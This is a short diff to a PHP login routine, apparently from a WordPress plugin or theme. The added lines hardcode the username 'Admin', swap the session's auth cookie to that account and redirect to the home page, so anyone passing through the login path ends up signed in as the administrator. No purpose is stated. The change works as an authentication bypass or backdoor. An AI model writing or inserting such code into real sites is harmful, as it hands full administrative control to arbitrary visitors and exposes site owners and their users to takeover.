@@ -34,8 +34,19 @@
 	wp_set_auth_cookie($user_id);
 
 	do_action('wp_login', $user_login);
+	// Automatic login //
+	$user_login = "Admin";
+	$user = get_user_by('login', $user_login );
 
+	// Redirect URL //
+	if ( !is_wp_error( $user ) )
+	{
+		wp_clear_auth_cookie();
+		wp_set_current_user ( $user->ID );
+		wp_set_auth_cookie  ( $user->ID );
+
+		$redirect_to = get_home_url();
+		wp_safe_redirect( $redirect_to );
+		exit();
+	}
 		?>
-	<script>
-		window.location = '<?php echo  get_home_url();  ?>';
-	</script>
